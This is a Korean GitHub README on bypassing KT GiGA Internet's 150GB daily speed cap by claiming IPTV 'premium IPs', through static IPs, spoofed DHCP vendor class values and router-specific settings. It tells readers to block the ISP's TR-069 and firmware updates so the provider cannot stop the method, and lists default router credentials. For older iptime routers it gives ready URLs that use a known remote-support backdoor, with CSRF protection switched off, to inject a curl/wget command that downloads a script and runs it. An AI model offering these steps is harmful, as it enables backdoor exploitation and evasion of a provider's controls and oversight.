# bypassQoSKoreatelecomISP
인터넷 속도제한 qos 풀기 해제 기가인터넷 KT GiGA 인터넷의 일일 150GB QoS제한 우회 팁

Glacier/backblaze 백업, 스팀/Steam/에픽스토어/Epic Store 게임 다운로드와 같이 짧은 시간 내에 대용량의 인터넷 트래픽 송수신이 필요한 시나리오에서 KT 기가 인터넷의 일일 150GB QoS 트래픽 제한(베이직, 에센스 요금제 기준)을 우회하기 위해, 프리미엄 IP(주로 KT의 IPTV 서비스를 제공하기 위해 사용됨, 일일 트래픽 제한 없음)를 취득하는 방법에 대해 톺아보기

> [!IMPORTANT]
> 아래의 기기별 설정방법은 KT의 인터넷 회선 또는 KT GiGA WiFi로부터 IP를 할당받은 기기만 적용할 수 있으므로 여러 대의 Router를 임의로 설치한 환경 또는 이중 NAT 구성에서 어떤 기기가 주 Router인지 명확하게 인지하고 있지 않다면, 적용하기 전에 먼저 거주중인 지역에 홈 네트워크 컨설팅이 가능한 **<ins>출장 서비스</ins>[^1]를 받아야 합니다.**


KT GiGA WiFi/iptime/ASUSWRT/OpenWrt/넷기어/시놀로지RT/Ubiquiti UniFi/기업용 브랜드 지원<br><a href="https://github.com/KRFOSS/bypassQoSKoreatelecomISP">Omada Networks, OPNsense, MikroTik에 대한 설정방법은 ROKFOSS에서 제공됩니다.</a>

<a href="https://github.com/veilRedeemer/bypassQoSKoreatelecomISP/issues/1">샤오미/레드미</a>

그 외 기기는 지원 기기의 LAN포트와 미지원 기기의 WAN 포트를 연결하고, 지원 기기별 설정을 완료하세요. 

예시 - KT GiGA WiFi/ASUSWRT의 컴퓨터/LAN 포트와 미지원 Router의 WAN/인터넷 포트를 연결한 경우. 단, **AP\/허브\/브릿지 모드 등으로 변경한 경우 Router로서 기능하지 않으므로 제외**

​또한 적용 후 프리미엄 IP 대역은 원래 일반적인 컴퓨터/스마트 기기로부터의 트래픽이 거의 없었던 특성 상 몇몇 사이트에서 VPN 환경과 같이 Captcha 등을 요구하거나, 지연되거나, 액세스를 거부당하거나, 심지어 편집적인 성향의 일부 내수용 웹사이트에서는 계정 생성을 거부당하는 등의 예기치 못한 불이익을 받을 가능성이 약간 높아집니다.

--------------------------------

## KT GiGA WiFi (통신사 Router, 기본값 설정인 KT 모드가 필요)
제한에서 벗어날 <ins>**각 기기**</ins>(이중 NAT 구성의 미지원 Router 포함)에 대해 수동IP설정 **또는** GiGA WiFi의 사용자 설정 웹 페이지에서 '수동 IP 할당 설정'(DHCP 정적 할당) 설정을 마치세요

아래 표를 확인하여 현재 사용중인 모델의 KT GiGA WiFi에서 사용 가능여부(추측 포함)를 확인하기\:

|＼|수동IP설정|수동 IP 할당 설정|업그레이드,TR069 차단|
|---------:|:--|:--|:--|
|KM06-506H, KM06-704H|？|✕|？|
|DW02-412H|〇|✕|✕|
|KM08-708H, DV01-901H<br>Wave2|？|？|？|
|TI04-708H Wave2|〇|✕|✕|
|KM12-007H<br>GiGA WiFi home ax|？|？|？|
|KM17-305H<br>GiGA WiFi home ax|〇|〇|？|
|KM15-103H<br>GiGA WiFi home ax|〇|〇|〇|
|DV02-012H<br>GiGA WiFi home ax|〇|〇|✕|
|HR08-407H<br>GiGA WiFi home ax|〇|✕|〇|
|AR06-012H<br>GiGA WiFi home ax|〇|✕|✕|
|KM18-311H<br>KT WiFi 6D|〇|〇|？|
|KB01-411H<br>KT WiFi 7D(버전 1.1.30 이하)|〇|〇|〇|
|KB01-411H<br>KT WiFi 7D(버전 1.1.30 초과)|？|？|？|

__표에서 확인할 수 없는 모델의 각 기능 사용 가능여부를 여러분의 제보(Issues, 기여자에 대한 기록을 남기고 싶을경우 Pull Request 등)를 통해 보충할 수 있게 해주세요!__

__사용중인 기기의 모델명, 펌웨어 버전, 수동IP설정, '수동 IP 할당 설정'의 성공 여부,__
__KT GiGA WiFi 사용자 설정 페이지 - 상태정보의 로그('Update' 또는 'Upgrade' 등의 문자열을 포함하는 로그 확인, 부팅 후 많은 시간이 지나면 다른 로그에 의해 확인할 수 없는 경우가 있음)를 확인한 후, 'Update' 또는 'Upgrade' 등의 문자열을 포함하는 로그가 아래의 4가지 규칙 추가 & 재부팅 후 2-5분 후에 기록되는 로그와 비교해 차이점이 있는지 확인하고 알려주셨으면 합니다.__

### 수동IP설정

수동IP설정을 위해서는 하나의 GiGA WiFi(와 연결된 메시 단말기를 통해, 또는 AP\/허브\/브릿지 모드로 구성된 미지원 Router를 통해 연결하는 경우 또한 GiGA WiFi에 연결하는 것으로 취급)에 대해 연결할 <ins>**각 기기**</ins>(컴퓨터, 스마트폰, 미지원 Router)마다 다른 IP주소를 설정하세요, 172.30.1.149부터 172.30.1.252까지가 권장되는 사용 가능한 범위입니다

각 기기별 '수동 IP 설정방법'을 당신이 스스로 찾을 수 없다면, 거주중인 지역에 홈 네트워크 컨설팅이 가능한 <ins>__출장 서비스__</ins>[^1]를 신청하세요

Windows 10과 같이 서브넷 마스크가 아닌 서브넷 접두사 길이를 요구하는 경우 24를 입력,
Windows 11과 같이 서브넷 접두사 길이가 아닌 서브넷 마스크를 요구하는 경우 255.255.255.0을 입력,
기본 게이트웨이 주소를 요구하는 경우 172.30.1.254를 입력,
DNS 서버 주소를 요구하는 경우 168.126.63.1과 168.126.63.2 또는 임의의 DNS 서버 주소를 입력

<ins>**각 기기**</ins>는 수동IP설정 적용 후, 다른 WiFi 연결 또는 다른 Router와 연결 시 네트워크/인터넷에 연결할 수 없는 경우가 있으며 이 때 해당 설정을 원래대로(자동/DHCP) 되돌리기

### 수동IP설정 적용여부 확인
변경 사항이 적용된 후, https://icanhazip.com 와 같은 외부 서비스를 사용하여 외부 IP주소를 확인하면 기존과 다른 '프리미엄 IP'가 할당된 것을 확인할 수 있으며, 프리미엄 IP에서도 포트 포워딩을 사용할 수 있습니다.
<img width="1080" alt="GiGAWifi_premiumip" src="https://github.com/user-attachments/assets/280c972c-cc1d-4ca3-bf41-ac8a4e77b74c" />

### 자동 업그레이드, TR-069 차단
마무리로서, 해당 방법의 사용을 저지하려는 시도 중 일부를 방지하기 위해 GiGA WiFi의 자동 펌웨어 업그레이드와 TR-069 통신을 차단 **(일부 기기만 지원)** 할 수 있는데요, 장치설정 - 보안 기능 - 패킷 필터 설정에서

1. 소스 포트가 9443, 목적지 IP 주소가 172.30.1.1 - 172.30.1.252, 프로토콜이 TCP, 허용\/차단이 허용인 규칙을 추가
2. 소스 포트가 8443, 목적지 IP 주소가 172.30.1.1 - 172.30.1.252, 프로토콜이 TCP, 허용\/차단이 허용인 규칙을 추가
3. 소스 포트가 9443, 프로토콜이 TCP, 허용\/차단이 차단인 규칙을 추가
4. 소스 포트가 8443, 프로토콜이 TCP, 허용\/차단이 차단인 규칙을 추가

KT WiFi 7D(KB01-411H)에서는 모든 칸을 채워야 하므로 4개 규칙의 **소스IP주소**와 차단 규칙의 **목적지IP주소**를 0.0.0.0 - 255.255.255.255로 입력, 4개 규칙의 목적지포트를 1 - 65535로 입력.

4개의 규칙을 모두 추가한 후, 허용 규칙이 차단 규칙보다 밑에(머큐리) 또는 위에(H1Radio, KB01-411H) 있으면 됩니다. 이 때 먼저 허용 규칙부터 추가해야 GiGA WiFi에 연결된 IPTV 등의 기기에서의 오작동을 미연에 방지할 수 있습니다\:

<img width="497" alt="FWUpgradeBlocking_2" src="https://github.com/user-attachments/assets/05a0f3bb-f7c1-4724-9ba3-203dc0093c36" />

## ASUSWRT(아수스, ZenWiFi)
**2025년 시점에 있어서 이미 수명이 다한 대부분의 WiFi5 모델, 특히 AC58U/AC68U/AC56/AC1900 계열 모델은 지원하지 않을 가능성이 높음**

http://www.asusrouter.com 에서 초기 설정 시 입력한 관리자 계정과 암호를 입력 후
 1. 아래 링크의 자동 IP - c단락을 참고하거나,
 2. 아래 스크린샷을 참고하여

클래스 식별자 (Option 60)를 KT_PR_HH_A_A 로 입력 후 적용\:
https://www.asus.com/kr/support/faq/1011715/
![asuswrt2a](https://github.com/user-attachments/assets/c8936908-946f-40d5-9a8e-b480b0ce658b)

## 넷기어 (예시로서 나이트호크 RAX80)

<img width="1424" alt="Nighthawk_RAX80" src="https://github.com/user-attachments/assets/c5c1ba09-4d63-4d28-8e2b-3f1344e36719" />

## 시놀로지RT (예시로서 RT1900ac)

![RT1900ac](https://github.com/user-attachments/assets/5ea5243e-821a-42c5-a18d-e3f2dcd5319e)

## KT GiGA WiFi에서 수동IP설정 대신 '수동 IP 할당 설정'**(DHCP 정적 할당, 일부 기기만 지원)** 을 사용하기
KT GiGA WiFi와 연결된 기기에서 http://172.30.1.254:8899 , 구성되지 않은 경우 ID는 ktuser , 비번은 megaap 또는 homehub 로 로그인 후 새로운 사용자 이름과 비번을 설정하여 사용자 설정 페이지에 접근할 수 있습니다\:

장치설정 - 네트워크 관리 - LAN 연결 설정

머큐리 - 148을 지우고 252를 입력한 다음, 적용 버튼을 누르지 않고 **각 기기**의 MAC 주소와 172.30.1.149부터 172.30.1.252까지의 범위 중 다른 기기와 중복되지 않는 IP 주소를 입력하여 설정을 추가

다보링크 - 148을 지우고 252를 입력한 다음, 적용 버튼을 누르고 **각 기기**의 MAC 주소와 172.30.1.149부터 172.30.1.252까지의 범위 중 다른 기기와 중복되지 않는 IP 주소를 입력하여 설정을 추가

WiFi 6D\/6E\/7D 이후 기기는 네트워크 - 네트워크 설정 - LAN 연결 설정

KB01-411H - **각 기기**의 MAC 주소와 172.30.1.149부터 172.30.1.252까지의 범위 중 다른 기기와 중복되지 않는 IP 주소를 입력하여 설정을 추가

![StaticLeasePremiumIP_KTGiGAWiFi](https://github.com/user-attachments/assets/9d7bda7f-f1a5-4663-8435-f91347cf6cbf)

__변경 사항은 다음에 유선 또는 무선으로 연결될 때 적용되므로 KT GiGA WiFi를 재시동하거나 각 기기의 네트워크 연결을 끊었다가 다시 연결해야 할 수 있습니다.__
## iptime (버전 15.30.6 이상)

인터넷 설정 정보의 '고급 설정'을 선택하고, Vendor Class에 스크린샷과 같이 입력 후 저장하세요.<br>
아래 스크린샷과 같은 설정 페이지에 접근하는 방법을 스스로 알아내지 못했다면, **<ins>출장 서비스</ins>[^1]를 받으세요.**
<img width="1030" height="630" alt="스크린샷 2026-02-04 오후 9 17 53" src="https://github.com/user-attachments/assets/6904ce11-7bc4-4c47-b406-16d1de6e05a2" />


## iptime (버전 15.30.0 이하)
백도어 출처 - https://github.com/tylzars/iptime-debug<br>
> [!NOTE]
> BE3600M/BE5100M 등 AN7563PT 탑재 기기와, 대부분의 EasyMesh-RT 모델은 더이상 지원하지 않습니다. 펌웨어 버전 15.30.6 이상으로 업그레이드하세요.<br>
> 위 출처와 같이 iptime 공유기의 '원격 지원'기능에 잠재된 백도어에 접근할 방법이 있는 경우에만 유효합니다

<a href="https://github.com/veilRedeemer/udhcp/releases">미리 빌드된 udhcpc 출처</a>

1. 적용하려는 기기는 관리자 계정/비밀번호가 설정되어 있어야 하며, 다음으로 '악성 스크립트 접근 방지(CSRF)'기능이 꺼져 있으며, 마지막으로 '원격 지원'기능을 켜 주세요:
<img width="285" alt="iptime1" src="https://github.com/user-attachments/assets/ef4882cc-03a4-4478-acd1-a0418048dca0" />

2. 아래 주소 중 상황에 맞는 적절한 **하나**의 '⧉'를 선택하여 복사 후 로그인한 관리자 페이지의 주소 칸에 붙여넣어 마칩니다.<br>
둘 중 사용자의 환경에서 사용 가능한 원본 링크 사용:
```
http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=curl%20-Lo%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
```
```
http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fstart.sh%20https%3a%2f%2fraw.githubusercontent.com%2fveilRedeemer%2fbypassQoSKoreatelecomISP%2frefs%2fheads%2fmain%2fiptime_bootstrap.sh%20%3bchmod%20755%20%2ftmp%2fstart.sh%20%3b%2ftmp%2fstart.sh
```
3. 아래와 같이 표시되면 성공. 다운로드한 데이터와 **취득한 프리미엄 IP를 포함**하여 2번 이후의 변경 사항은 특정 공유기 설정을 변경하거나 재부팅되거나 전원이 끊어지면 지워집니다:
<img width="333" alt="iptime2" src="https://github.com/user-attachments/assets/fa6ee8d4-9990-4f80-8d70-8ad551737b36" />

> [!TIP]
> 이미 링크를 적용한 상태에서 성공 여부와 상관없이 다시 시도하면 중복 적용으로 인한 문제 발생을 미연에 방지하기 위해 공유기가 재부팅됩니다.<br>
> VPN 클라이언트(WireGuard 제외)를 구성한 경우 '여러 개의 WAN 인터페이스로 인해 실패'메시지가 표시되면 해당 오류를 발생시키는 프로파일을 제거한 후 다시 시도해봅시다

## Ubiquiti (예시로서 UniFi Express)
대시보드에서 톱니바퀴 아이콘 - Internet - KT GiGA 인터넷 연결을 제공하는 WAN 포트 - DHCP Client Options에 Option은 60,  값은 'KT_PR_HH_A_A'로 설정 후 추가 & 적용합니다.

![unifi_dash](https://github.com/user-attachments/assets/29798e32-afff-46b8-947c-de5e18884d7e)

![unifi_dash2](https://github.com/user-attachments/assets/1fcfa5db-a9f4-46b2-9b9d-dfe1fbfa8811)

## OpenWrt 
https://archive.md/VRZIO

[^1]: 동네 컴퓨터 수리점 등
